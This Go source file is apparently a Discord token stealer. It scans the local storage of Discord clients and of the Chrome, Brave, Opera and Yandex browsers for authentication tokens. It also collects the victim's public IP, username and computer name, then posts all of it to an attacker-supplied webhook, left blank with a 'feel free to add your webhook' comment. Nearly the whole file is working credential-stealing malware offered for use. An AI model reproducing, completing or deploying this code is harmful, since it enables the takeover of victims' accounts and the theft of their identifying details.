package main

import (
	"bufio"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

var (
	webhook = "" // Feel free to add your webhook here ;)
)

func GrabIP() (string, error) {
	resp, err := http.Get("https://ip-api.com/json")
	defer resp.Body.Close()
	if err != nil {
		return "", errors.New("No hay conexion a internet")
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", errors.New("No se pudo decodificar el body")
	}

	return string(body), nil
}

func GrabTk() string {
	re := regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
	local, roaming := os.Getenv("LOCALAPPDATA"), os.Getenv("APPDATA")
	paths := map[string]string{
		"Discord":        roaming + "\\Discord",
		"Discord Canary": roaming + "\\discordcanary",
		"Discord PTB":    roaming + "\\discordptb",
		"Opera":          roaming + "\\Opera Software\\Opera Stable",
		"Chrome":         local + "\\Google\\Chrome\\User Data\\Default",
		"Brave":          local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
		"Yandex":         local + "\\Yandex\\YandexBrowser\\User Data\\Default",
	}
	msg := "@everyone Yikes\n"

	for _, path := range paths {
		path = path + "\\Local Storage\\leveldb"

		_, err := os.Stat(path)
		if os.IsNotExist(err) {
			continue
		}

		dir, err := ioutil.ReadDir(path)
		if err != nil {
			continue
		}

		for _, file := range dir {
			if !strings.HasSuffix(file.Name(), ".ldb") || !strings.HasSuffix(file.Name(), ".log") {
				continue
			}

			f, err := os.OpenFile(path+"\\"+file.Name(), os.O_RDONLY, os.ModePerm)
			defer f.Close()
			if err != nil {
				continue
			}

			scanner := bufio.NewScanner(f)

			for scanner.Scan() {
				ln := scanner.Text()

				for _, tk := range re.FindAllString(ln, -1) {
					msg = msg + path + " Token: " + tk + "\n"
				}
			}
		}
	}

	return msg
}

func main() {
	IP, err := GrabIP()
	if err != nil {
		go main()
		return
	}

	Tkns := GrabTk()

	name := os.Getenv("USERNAME") + " " + os.Getenv("COMPUTERNAME")

	msg := fmt.Sprintf("@everyone Yikes\n```%s```\n```%s```\n```%s```", Tkns, IP, name)

	_, err = http.PostForm(webhook, url.Values{"content": {msg}})
	if err != nil {
		go main()
		return
	}
}
